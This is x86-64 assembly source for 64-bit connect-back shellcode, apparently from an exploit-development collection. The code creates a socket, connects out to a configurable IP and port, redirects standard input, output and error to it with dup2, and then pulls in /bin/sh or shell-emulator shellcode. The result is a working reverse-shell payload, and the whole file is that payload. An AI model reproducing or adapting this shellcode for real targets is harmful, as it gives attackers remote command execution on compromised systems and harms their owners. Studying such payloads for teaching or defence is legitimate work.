	;; Evan Jensen (wont) 012014
	;; 64bit Connect back shellcode
	;; Handy One liner for IP
	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
	;; port is littleEndian
%include "short64.s"
%include "syscall.s"
%include "util.s"

	
%define IP  		ip(127,0,0,1)
%define PORT		htons(7788)		;port 7788 Little Endian
%define AF_INET 	2
%define SOCK_STREAM	1
%define ANY_PROTO	0
	
;;; 	socket -> connect -> dup -> shell
	
BITS 64
	global main
	

	
main:
	
open_my_socket:
	xor edx, edx; ANY_PROTO
	lea edi, [rdx+AF_INET]
	lea esi, [rdx+SOCK_STREAM]
	lea eax, [rdx+socket]
	syscall

	xchg rax,rdi
make_sockaddr:
	xor edx, edx
	push rdx		;lame part of sockaddr
	mov rax, (IP <<32 | PORT <<16 | AF_INET) 
	push rax		;important part of sockaddr
	
	mov rsi,rsp		;struct sockaddr*
	lea eax, [rdx+connect]
	mov dl, 0x10
	syscall
	;; assume success (RAX=0)
	
	
	xor eax, eax
	lea esi, [rax+2]	;loop count and FD#

copy_stdin_out_err:
	mov al, dup2
	syscall
	dec esi
	jns copy_stdin_out_err
	
	;; Any local shellcode here
	
%define EMULATOR
	%ifdef 	EMULATOR
	;;  shell emulating shellcode
	incbin "../64shellEmulator/shellcode"
%else
	;;  ordinary shellcode (/bin/sh)
	incbin "../64BitLocalBinSh/shellcode"
%endif
